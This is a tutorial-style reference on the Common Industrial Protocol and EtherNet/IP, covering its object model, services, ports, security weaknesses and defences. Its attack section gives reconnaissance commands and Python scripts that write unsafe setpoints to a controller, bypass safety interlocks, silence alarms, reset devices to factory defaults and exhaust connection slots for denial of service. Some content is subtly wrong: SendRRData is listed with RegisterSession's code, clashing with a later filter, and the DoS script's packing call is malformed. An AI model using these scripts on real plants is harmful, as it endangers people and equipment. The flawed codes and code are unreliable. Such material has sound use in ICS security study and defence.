# Common Industrial Protocol (CIP)

# CIP — Common Industrial Protocol

## Overview

**CIP (Common Industrial Protocol)** is an **open, industrial communication protocol** developed and maintained by **ODVA (Open DeviceNet Vendors Association)**, founded in **1995**. CIP provides a **unified communication architecture** for industrial automation devices — from simple sensors and actuators up to complex controllers and enterprise systems.

CIP is unique because it is **not tied to a single physical/transport layer** — instead it is a **shared application layer protocol** that runs over multiple network technologies:

```
┌─────────────────────────────────────────────────────────┐
│              CIP Application Layer                      │
│     (Same object model, services, and data types)       │
└───────┬──────────────┬──────────────┬───────────────────┘
        │              │              │              │
┌───────▼──────┐ ┌─────▼──────┐ ┌────▼──────┐ ┌────▼──────┐
│ EtherNet/IP  │ │  DeviceNet │ │ ControlNet│ │ CompoNet  │
│ (TCP/UDP)    │ │  (CAN bus) │ │(Coax/Fiber│ │ (RS-485)  │
└──────────────┘ └────────────┘ └───────────┘ └───────────┘
```

> 💡 Think of CIP as the **"language"** spoken at the application layer, while EtherNet/IP, DeviceNet, ControlNet, and CompoNet are the different **"roads"** it can travel on.

---

## CIP Network Family

| Network | Transport | Speed | Topology | Primary Use |
|---|---|---|---|---|
| **EtherNet/IP** | TCP/UDP over Ethernet | 10/100/1000 Mbps | Star/Tree | Controllers, SCADA, HMI |
| **DeviceNet** | CAN bus | 125/250/500 Kbps | Trunk/Drop | Sensors, actuators, drives |
| **ControlNet** | Coax/Fiber (CTDMA) | 5 Mbps | Bus/Tree/Star | Motion, I/O, peer-to-peer |
| **CompoNet** | RS-485 | 4 Mbps | Branch/Tree | Simple bit/word I/O devices |

**EtherNet/IP** is by far the most widely deployed today and is the primary focus of ICS security research.

---

## Who Uses CIP / EtherNet/IP

- **Rockwell Automation / Allen-Bradley** — The dominant vendor (ControlLogix, CompactLogix, MicroLogix, PLC-5)
- **Omron** — NJ/NX series controllers
- **Schneider Electric** — Some product lines
- **Molex, Turck, Pepperl+Fuchs** — Field devices
- **Drives, VFDs, robots, motion controllers** — Across many manufacturers

### Industries
- 🏭 **Manufacturing** — Assembly lines, automotive, packaging
- 🛢️ **Oil & Gas** — Refineries, pipeline control
- 💧 **Water/Wastewater** — Treatment and distribution
- ⚡ **Power** — Generation and distribution
- 🍔 **Food & Beverage** — Process and packaging
- 🚗 **Automotive** — Body shops, paint, assembly
- 💊 **Pharmaceutical** — Batch manufacturing

---

## CIP Object Model

CIP is built around a **strict object-oriented model**. Everything in a CIP device is represented as an **object**:

```
CIP Device
├── Object 1: Identity Object          (who am I?)
├── Object 2: Message Router Object    (how do I route messages?)
├── Object 3: DeviceNet Object         (DeviceNet-specific config)
├── Object 4: Assembly Object          (I/O data groupings)
├── Object 6: Connection Manager       (manage connections)
├── Object F4: EtherNet/IP Object      (TCP/IP config)
├── Object F5: TCP/IP Interface Object (network settings)
├── Object F6: Ethernet Link Object    (physical link stats)
└── Vendor-Specific Objects            (custom functionality)
```

### Object Structure

Every CIP object has:

```
┌────────────────────────────────────────────┐
│               CIP Object                  │
│                                           │
│  Class ID: 0x01 (e.g., Identity Object)   │
│                                           │
│  ┌─────────────────────────────────────┐  │
│  │         Class Attributes           │  │
│  │  Revision, Max Instance, etc.      │  │
│  └─────────────────────────────────────┘  │
│                                           │
│  ┌─────────────────────────────────────┐  │
│  │      Instance 1 Attributes         │  │
│  │  Attr 1: Vendor ID    = 0x0001     │  │
│  │  Attr 2: Device Type  = 0x000E     │  │
│  │  Attr 3: Product Code = 0x0036     │  │
│  │  Attr 4: Revision     = 1.13       │  │
│  │  Attr 5: Status       = 0x0030     │  │
│  │  Attr 6: Serial Num   = 0x645A3B2C │  │
│  │  Attr 7: Product Name = "1756-L75" │  │
│  └─────────────────────────────────────┘  │
│                                           │
│  ┌─────────────────────────────────────┐  │
│  │           Services                 │  │
│  │  Get_Attribute_Single              │  │
│  │  Set_Attribute_Single              │  │
│  │  Reset                             │  │
│  └─────────────────────────────────────┘  │
└────────────────────────────────────────────┘
```

### Key CIP Object Classes

| Class ID | Object Name | Purpose |
|---|---|---|
| `0x01` | **Identity** | Device ID, vendor, product name, serial, revision |
| `0x02` | **Message Router** | Routes explicit messages to correct object |
| `0x04` | **Assembly** | Groups I/O data for efficient transfer |
| `0x06` | **Connection Manager** | Manages all CIP connections |
| `0x29` | **Parameter** | Device parameter access |
| `0x2C` | **Position Controller** | Motion control |
| `0x37` | **Ethernet Link** | Physical link stats and config |
| `0x43` | **Time Sync** | IEEE 1588 PTP time synchronization |
| `0x44` | **Motion Axis** | Servo/motion control |
| `0x48` | **HART** | HART protocol integration |
| `0xF4` | **EtherNet/IP** | EtherNet/IP-specific settings |
| `0xF5` | **TCP/IP Interface** | TCP/IP network configuration |
| `0xF6` | **Ethernet Link** | MAC, speed, duplex, counters |

---

## CIP Addressing — EPATH

CIP uses a structured **Electronic Path (EPATH)** to address objects, instances, and attributes:

```
EPATH Segment Types:
┌─────────────┬──────────────────────────────────────────┐
│ Segment     │ Example                                  │
├─────────────┼──────────────────────────────────────────┤
│ Class       │ 0x20 0x01    → Class 0x01 (Identity)     │
│ Instance    │ 0x24 0x01    → Instance 1                │
│ Attribute   │ 0x30 0x07    → Attribute 7 (Product Name)│
│ Connection  │ 0x01 0x00... → Connection point          │
│ Port        │ 0x01 0x02    → Port 1, Link 2            │
│ Symbolic    │ 0x91 "Tag1"  → Named tag access          │
└─────────────┴──────────────────────────────────────────┘
```

### Tag Addressing (Rockwell/Allen-Bradley)
Allen-Bradley ControlLogix adds **symbolic tag addressing** — a major feature:

```
Controller Tags:
├── "MotorSpeed"          → REAL (global controller tag)
├── "TankLevel[0]"        → REAL array element
├── "Conveyor.Running"    → BOOL member of UDT
├── "Recipe[2].Temp"      → REAL in UDT array
└── Program Tags:
    └── "Program:Main.Counter" → INT in specific program
```

This means you can read/write **named process variables** directly — extremely powerful and equally dangerous if unauthenticated.

---

## CIP Services

CIP defines **common services** available across all objects (and object-specific services):

### Common Services
| Service Code | Name | Description |
|---|---|---|
| `0x01` | **Get_Attributes_All** | Read all attributes of an object instance |
| `0x02` | **Set_Attributes_All** | Write all attributes of an object instance |
| `0x03` | **Get_Attribute_List** | Read a specified list of attributes |
| `0x04` | **Set_Attribute_List** | Write a specified list of attributes |
| `0x05` | **Reset** | Reset the object/device |
| `0x06` | **Start** | Start device operation |
| `0x07` | **Stop** | Stop device operation |
| `0x08` | **Create** | Create a new object instance |
| `0x09` | **Delete** | Delete an object instance |
| `0x0A` | **Multiple_Service_Packet** | Bundle multiple services in one request |
| `0x0B` | **Apply_Attributes** | Apply stored attribute changes |
| `0x0E` | **Get_Attribute_Single** | Read a single specific attribute |
| `0x10` | **Set_Attribute_Single** | Write a single specific attribute |
| `0x14` | **Find_Next_Object_Instance** | Browse object instances |
| `0x4B` | **Execute_Program** | Execute a program/routine |
| `0x4C` | **Read_Tag** | Read a named controller tag |
| `0x4D` | **Write_Tag** | Write a named controller tag |
| `0x4E` | **Read_Tag_Fragmented** | Read large tag data in fragments |
| `0x4F` | **Write_Tag_Fragmented** | Write large tag data in fragments |
| `0x55` | **Read_Modify_Write_Tag** | Atomic read-modify-write on a tag |

---

## CIP Connection Types

CIP supports two fundamentally different messaging types:

### 1. Explicit Messaging (Request/Response)
- **Purpose**: Configuration, diagnostics, non-time-critical data
- **Model**: Client/server request-response (like HTTP)
- **Transport**: TCP (reliable)
- **Timing**: On-demand, no fixed rate

```
Client                          Server (PLC/Device)
  |── CIP Request ─────────────►|
  |   (Service + EPATH + Data)  |
  |◄── CIP Response ────────────|
  |   (Status + Response Data)  |
```

### 2. Implicit Messaging (I/O Messaging)
- **Purpose**: Real-time I/O data exchange (time-critical)
- **Model**: Producer/Consumer (publish-subscribe)
- **Transport**: UDP (low latency)
- **Timing**: Fixed cyclic rate (Requested Packet Interval - RPI)

```
Producer (PLC)                  Consumer (Drive/Device)
  |── I/O Data (UDP) ──────────►| Every RPI (e.g., 10ms)
  |── I/O Data (UDP) ──────────►|
  |── I/O Data (UDP) ──────────►|
  |◄── I/O Data (UDP) ──────────| (bidirectional)
```

### Connection Parameters
| Parameter | Description |
|---|---|
| **RPI (Requested Packet Interval)** | Desired data update rate (e.g., 10ms, 100ms) |
| **O→T (Originator to Target)** | Data flowing from controller to device |
| **T→O (Target to Originator)** | Data flowing from device to controller |
| **Connection Size** | Max bytes per packet |
| **Connection Type** | Unicast or Multicast |
| **Priority** | Scheduled, High, Low, Urgent |

---

## EtherNet/IP — CIP Over Ethernet

**EtherNet/IP** is the most important CIP network for security professionals — it runs CIP over standard **TCP/IP and UDP/IP**.

### Ports
| Port | Protocol | Purpose |
|---|---|---|
| **44818/TCP** | EtherNet/IP | Explicit messaging (configuration, tag read/write) |
| **2222/UDP** | EtherNet/IP | Implicit messaging (real-time I/O data) |
| **44818/UDP** | EtherNet/IP | ListIdentity broadcast/multicast discovery |

### EtherNet/IP Encapsulation

CIP messages are wrapped in an **EtherNet/IP Encapsulation** layer:

```
┌──────────────────────────────────────────────────────┐
│              EtherNet/IP Encapsulation               │
├──────────┬──────────┬──────────┬────────────────────-┤
│ Command  │  Length  │ Session  │      Status         │
│ (2 bytes)│ (2 bytes)│ (4 bytes)│      (4 bytes)      │
├──────────┴──────────┴──────────┴─────────────────────┤
│             Sender Context (8 bytes)                 │
├──────────────────────────────────────────────────────┤
│                Options (4 bytes)                     │
├──────────────────────────────────────────────────────┤
│              Command Data (Variable)                 │
│            (CIP message payload)                     │
└──────────────────────────────────────────────────────┘
```

### EtherNet/IP Encapsulation Commands

| Command | Code | Description |
|---|---|---|
| **NOP** | `0x0000` | No operation (keep-alive) |
| **ListServices** | `0x0004` | List supported services |
| **ListIdentity** | `0x0063` | Discover device identity (broadcast) |
| **ListInterfaces** | `0x0064` | List communication interfaces |
| **RegisterSession** | `0x0065` | Establish a session (get session handle) |
| **UnRegisterSession** | `0x0066` | Terminate a session |
| **SendRRData** | `0x0065` | Send explicit request/response message |
| **SendUnitData** | `0x0070` | Send I/O (implicit) data |
| **IndicateStatus** | `0x0072` | Device status indication |

---

## Connection Establishment (EtherNet/IP)

```
Client                              EtherNet/IP Device
  |                                         |
  |── TCP Connect ─────────────────────────►|  Port 44818
  |◄── TCP Accept ──────────────────────────|
  |                                         |
  |── RegisterSession (0x0065) ────────────►|
  |   (Request session handle)              |
  |◄── RegisterSession Response ────────────|
  |   Session Handle: 0x00A1B2C3            |
  |                                         |
  |── SendRRData (Explicit Message) ───────►|
  |   Session: 0x00A1B2C3                   |
  |   CIP: Read Tag "MotorSpeed"            |
  |◄── SendRRData Response ─────────────────|
  |   Status: 0x00 (Success)               |
  |   Data: 1450.5 (REAL)                  |
  |                                         |
  |── UnRegisterSession ───────────────────►|
  |── TCP Close ───────────────────────────►|
```

---

## ListIdentity — Device Discovery

**ListIdentity** is one of the most important commands for reconnaissance. It can be sent as a **UDP broadcast** to discover all EtherNet/IP devices on a subnet — **no authentication required**:

```bash
# Send ListIdentity broadcast
→ UDP Broadcast to 255.255.255.255:44818
  Command: 0x0063 (ListIdentity)
  Length: 0x0000
  (No session needed)

# Every EtherNet/IP device responds with:
◄ ListIdentity Response:
  Vendor ID:       0x0001  → Allen-Bradley
  Device Type:     0x000E  → Programmable Logic Controller  
  Product Code:    0x0036  → 1756-L75 ControlLogix
  Revision:        20.13   → Firmware v20.13
  Status:          0x0030  → Running, no faults
  Serial Number:   0x645A3B2C
  Product Name:    "1756-L75 LOGIX5575"
  State:           0x03    → Operational
  IP Address:      192.168.1.10
```

> ⚠️ **Security Implication**: A single UDP broadcast instantly reveals **every EtherNet/IP device** on a network — model numbers, firmware versions, serial numbers — all without authentication. Perfect for targeted attack planning.

---

## Tag Read/Write Operations

### Reading a Tag (Service 0x4C)
```
CIP Request:
├── Service: 0x4C (Read_Tag)
├── EPATH: 0x91 0x0A "MotorSpeed" 0x00  (symbolic segment)
└── Elements: 0x0001  (read 1 element)

CIP Response:
├── Service: 0xCC (0x4C | 0x80 = response)
├── Status: 0x00 (Success)
├── Data Type: 0x00CA (REAL)
└── Value: 0x4455A800  → 854.5 RPM (IEEE 754)
```

### Writing a Tag (Service 0x4D)
```
CIP Request:
├── Service: 0x4D (Write_Tag)
├── EPATH: 0x91 0x0A "MotorSpeed" 0x00
├── Data Type: 0x00CA (REAL)
├── Elements: 0x0001
└── Value: 0x00000000  → 0.0 (STOP motor!)

CIP Response:
├── Service: 0xCD (response)
└── Status: 0x00 (Success — motor setpoint written!)
```

> ⚠️ **No authentication required** on most Allen-Bradley ControlLogix/CompactLogix systems by default.

---

## CIP Data Types

| Type Code | Name | Size | Description |
|---|---|---|---|
| `0x00C1` | **BOOL** | 1 bit | Boolean true/false |
| `0x00C2` | **SINT** | 8 bits | Signed 8-bit integer |
| `0x00C3` | **INT** | 16 bits | Signed 16-bit integer |
| `0x00C4` | **DINT** | 32 bits | Signed 32-bit integer |
| `0x00C5` | **LINT** | 64 bits | Signed 64-bit integer |
| `0x00C6` | **USINT** | 8 bits | Unsigned 8-bit integer |
| `0x00C7` | **UINT** | 16 bits | Unsigned 16-bit integer |
| `0x00C8` | **UDINT** | 32 bits | Unsigned 32-bit integer |
| `0x00C9` | **ULINT** | 64 bits | Unsigned 64-bit integer |
| `0x00CA` | **REAL** | 32 bits | IEEE 754 single float |
| `0x00CB` | **LREAL** | 64 bits | IEEE 754 double float |
| `0x00D0` | **STRING** | Variable | String with length prefix |
| `0x00A0` | **STRUCT** | Variable | User-Defined Type (UDT) |
| `0x00A3` | **ARRAY** | Variable | Array of any type |

---

## CIP Security Model

### Original CIP Security — None
Like most ICS protocols, CIP/EtherNet/IP was designed with **zero security**:
- No authentication
- No encryption
- No authorization
- No integrity protection

### CIP Security (Added 2016 — ODVA Vol. 8)
ODVA eventually added **CIP Security** as an optional extension:

```
┌────────────────────────────────────────┐
│           CIP Application              │
├────────────────────────────────────────┤
│         CIP Security Layer             │
│  ┌──────────────┐  ┌────────────────┐  │
│  │   DTLS       │  │    TLS 1.2/1.3 │  │
│  │ (UDP/Implicit│  │  (TCP/Explicit)│  │
│  │  messaging)  │  │   messaging)   │  │
│  └──────────────┘  └────────────────┘  │
├────────────────────────────────────────┤
│         EtherNet/IP Transport          │
└────────────────────────────────────────┘
```

**CIP Security Features:**
| Feature | Details |
|---|---|
| **TLS 1.2/1.3** | Explicit message encryption |
| **DTLS 1.2** | Implicit (I/O) message encryption |
| **X.509 Certificates** | Device and user authentication |
| **User Authentication** | Username/password or certificate-based |
| **Authorization** | Role-based access control (RBAC) |
| **Integrity** | Message signing prevents tampering |
| **Audit Logging** | Security event logging |

**Deployment Reality:**
- CIP Security is **optional** and **rarely deployed** — as of today most installations still use unauthenticated CIP
- Requires **hardware capable** of TLS/DTLS processing — many legacy devices never updated
- **Rockwell** has been adding CIP Security to newer ControlLogix/CompactLogix firmware

---

## Security Weaknesses & Attack Surface

### Protocol-Level Weaknesses
| Weakness | Details |
|---|---|
| **No Authentication (default)** | Any host can read/write tags and control devices |
| **No Encryption** | All tag values, I/O data, and commands in cleartext |
| **No Authorization** | No concept of user roles or permissions |
| **ListIdentity Broadcast** | Single UDP packet maps entire OT network instantly |
| **Tag Read/Write (0x4C/0x4D)** | Direct process variable manipulation without credentials |
| **Reset Service (0x05)** | Unauthenticated device reset/reboot |
| **Forward_Open Flooding** | Exhaust connection resources → DoS |
| **I/O Spoofing** | Inject fake I/O data via UDP 2222 on flat networks |
| **Broadcast Writes** | Potential to target multiple devices simultaneously |

### Common Misconfigurations
| Misconfiguration | Impact |
|---|---|
| **No network segmentation** | Direct access from IT to OT — any corporate host can reach PLCs |
| **Port 44818 exposed** | EtherNet/IP reachable from internet (Shodan finds thousands) |
| **No firewall rules** | All CIP services accessible from any host |
| **Unused ports open** | Port 80 (web server), 443, SNMP open on controllers |
| **Default gateway set incorrectly** | PLCs accidentally routable beyond intended subnet |
| **CIP Security disabled** | Even on capable hardware, security features never enabled |
| **No controller password** | Rockwell controllers ship with no password by default |
| **FTP enabled** | Some controllers run FTP for file transfer — credentials often default |

---

## Attack Techniques

### Reconnaissance
```bash
# Nmap EtherNet/IP discovery and enumeration
nmap -p 44818 --script enip-info <target>

# Example output:
# PORT      STATE SERVICE
# 44818/tcp open  EtherNet/IP
# | enip-info:
# |   Vendor ID: Rockwell Automation/Allen-Bradley (1)
# |   Device Type: Programmable Logic Controller (14)
# |   Product Code: 166
# |   Revision: 20.13
# |   Status: 0x0030
# |   Serial: 0x645a3b2c
# |_  Product Name: 1756-L75 LOGIX5575

# UDP ListIdentity broadcast scan
nmap -p U:44818 --script enip-info --script-args broadcast \
  192.168.1.0/24

# Metasploit EtherNet/IP scanner
use auxiliary/scanner/scada/enip_list_identity
set RHOSTS 192.168.1.0/24
run
```

### Tag Enumeration & Reading (Python — pycomm3)
```python
from pycomm3 import LogixDriver

# Connect to Allen-Bradley ControlLogix (no auth needed!)
with LogixDriver('192.168.1.10') as plc:
    
    # Get controller info
    print(plc.info)
    # {'vendor': 'Rockwell Automation/Allen-Bradley',
    #  'product_type': 'Programmable Logic Controller',
    #  'product_code': 166,
    #  'revision': {'major': 20, 'minor': 13},
    #  'serial': '0x645a3b2c',
    #  'product_name': '1756-L75 LOGIX5575'}
    
    # Get all controller tags (enumerate entire tag database!)
    all_tags = plc.get_tag_list()
    for tag in all_tags:
        print(f"{tag['tag_name']}: {tag['data_type']}")
    
    # Read specific tags
    results = plc.read('MotorSpeed', 'TankLevel', 'PumpRunning')
    for tag, value, error in results:
        print(f"{tag} = {value} (error: {error})")

    # Read an array
    array_data = plc.read('RecipeTemps[0]', 'RecipeTemps[1]',
                          'RecipeTemps[2]')
```

### Process Manipulation (Writing Tags)
```python
from pycomm3 import LogixDriver

with LogixDriver('192.168.1.10') as plc:
    
    # Write to process variables (NO AUTHENTICATION!)
    
    # Stop a motor
    plc.write(('MotorEnable', False))
    
    # Change a temperature setpoint
    plc.write(('TempSetpoint', 999.9))  # Way above safe limit!
    
    # Open a valve
    plc.write(('ValveOpen', True))
    
    # Change multiple values atomically
    plc.write(
        ('PumpSpeed', 0),          # Stop pump
        ('HeaterEnable', True),    # Turn on heater
        ('SafetyBypass', True),    # Disable safety!
        ('AlarmSilence', True)     # Silence alarms!
    )
    
    print("Process manipulated — no credentials required")
```

### Device Reset
```python
from cpppo.server.enip import client

# Send CIP Reset service to reboot a device
# Service 0x05 on Identity Object (class 0x01, instance 0x01)
with client.connector(host='192.168.1.10', port=44818) as conn:
    conn.register()
    
    # Reset type 0 = Power cycle emulation
    # Reset type 1 = Factory defaults (destructive!)
    conn.send(
        conn.request(
            path=[{'class': 0x01}, {'instance': 0x01}],
            service=0x05,  # Reset
            data=[0x00]    # Reset type
        )
    )
```

### Forward_Open DoS
```python
# Exhaust connection resources by opening many connections
# EtherNet/IP devices have limited connection table slots

import socket
import struct

def send_register_session(sock):
    # RegisterSession encapsulation command
    packet = struct.pack('<HHIIQII',
        0x0065,  # Command: RegisterSession
        0x0004,  # Length: 4
        0x0000,  # Session handle (0 = new)
        0x0000,  # Status
        0x0000000000000000,  # Sender context
        0x0000,  # Options
        0x0001,  # Protocol version
        0x0000   # Options flags
    )
    sock.send(packet)
    return sock.recv(1024)

# Flood with connection requests → exhaust connection table → DoS
connections = []
for i in range(256):  # Most devices max out around 64-256
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.1.10', 44818))
    send_register_session(sock)
    connections.append(sock)
    print(f"Connection {i} established")
```

---

## Wireshark Analysis

```
# EtherNet/IP / CIP Wireshark filters:
enip                              # All EtherNet/IP traffic
cip                               # All CIP messages
enip.command == 0x0063            # ListIdentity (discovery)
enip.command == 0x0065            # RegisterSession
enip.command == 0x006F            # SendRRData (explicit msg)
enip.command == 0x0070            # SendUnitData (I/O data)

cip.service == 0x4c               # Read Tag requests
cip.service == 0x4d               # Write Tag requests
cip.service == 0x05               # Reset service
cip.service == 0x4b               # Execute Program

cip.status == 0x00                # Successful responses
cip.status != 0x00                # Error responses

# Filter by object class
cip.path.class_id == 0x01         # Identity object access
cip.path.class_id == 0x06         # Connection Manager

# I/O data monitoring
udp.port == 2222                  # CIP I/O implicit messaging
```

---

## CIP vs Other ICS Protocols

| Feature | CIP/EtherNet/IP | Modbus TCP | DNP3 | S7comm |
|---|---|---|---|---|
| **Developed** | 1995/2000 | 1979 | 1990 | ~1994 |
| **Ownership** | Open (ODVA) | Open | Open (IEEE) | Proprietary (Siemens) |
| **Transport** | TCP+UDP/44818,2222 | TCP/502 | TCP/20000 | TCP/102 |
| **Data Model** | Object-oriented tags | Coils/Registers | Object library | Memory areas |
| **Authentication** | Optional (CIP Security) | None | Optional (DNP3-SA) | None (classic) |
| **Encryption** | Optional (TLS/DTLS) | None | None | None |
| **Discovery** | ListIdentity broadcast | None built-in | None built-in | SZL read |
| **I/O Messaging** | UDP multicast/unicast | Poll-only | Unsolicited reports | Cyclic subscription |
| **Primary Vendor** | Rockwell/Allen-Bradley | Generic | Utilities | Siemens |
| **Complexity** | High | Very Low | High | Medium |

---

## Defensive Recommendations

| Control | Implementation |
|---|---|
| **Network Segmentation** | Isolate EtherNet/IP devices in dedicated OT VLAN |
| **Block Port 44818** | Restrict EtherNet/IP to authorized hosts only via ACLs |
| **Block Port 2222** | Restrict I/O messaging to known controller/device pairs |
| **Enable CIP Security** | Deploy TLS/DTLS where hardware supports it |
| **Controller Password** | Enable Rockwell controller access protection levels |
| **Firewall CIP Services** | Use CIP-aware firewall to filter dangerous services (Reset, Write) |
| **Disable Unused Services** | Disable HTTP, FTP, SNMP on controllers if not needed |
| **Monitor ListIdentity** | Alert on unexpected ListIdentity broadcasts (recon indicator) |
| **Whitelist Tag Writes** | Use CIP Security RBAC to restrict which tags can be written |
| **Asset Inventory** | Use ListIdentity passively to build and maintain device inventory |
| **Firmware Updates** | Keep controller firmware current — Rockwell regularly patches |
| **Network Monitoring** | Deploy Claroty/Dragos/Nozomi for CIP-aware anomaly detection |

---

## Tools for CIP / EtherNet/IP

| Tool | Purpose |
|---|---|
| **pycomm3** | Python library for Allen-Bradley ControlLogix/CompactLogix |
| **cpppo** | Python CIP/EtherNet/IP implementation |
| **python-enip** | EtherNet/IP Python library |
| **Nmap enip-info script** | EtherNet/IP device discovery |
| **Metasploit enip modules** | Scanner and exploitation modules |
| **Wireshark** | Built-in EtherNet/IP/CIP dissector |
| **EtherNet/IP Scanner (Claroty)** | Commercial OT asset discovery |
| **RSLinx / Studio 5000** | Rockwell's own engineering tools (legitimate use) |
| **Shodan** | `port:44818` finds internet-exposed EtherNet/IP devices |

---

## Summary

```
CIP in a nutshell:
├── Full Name: Common Industrial Protocol
├── Developed: 1995 by ODVA
├── Maintained by: ODVA (Open DeviceNet Vendors Association)
├── Purpose: Universal application layer for industrial automation
│
├── Network Variants:
│   ├── EtherNet/IP → TCP 44818 / UDP 2222 (dominant)
│   ├── DeviceNet   → CAN bus (field devices)
│   ├── ControlNet  → Coax/fiber (motion/I/O)
│   └── CompoNet    → RS-485 (simple I/O)
│
├── Key Concepts:
│   ├── Object model (Class → Instance → Attribute)
│   ├── EPATH addressing (class, instance, attribute, symbolic)
│   ├── Explicit messaging (TCP — config/read/write)
│   ├── Implicit messaging (UDP — real-time I/O)
│   └── Tag-based access (Allen-Bradley symbolic tags)
│
├── Security:
│   ├── Default: Zero (no auth, no encryption)
│   ├── CIP Security (2016): Optional TLS/DTLS + PKI
│   ├── Rarely deployed in production environments
│   └── ListIdentity: Unauthenticated network-wide recon
│
├── Primary Vendor: Rockwell Automation / Allen-Bradley
└── Status: Dominant in North American manufacturing
```
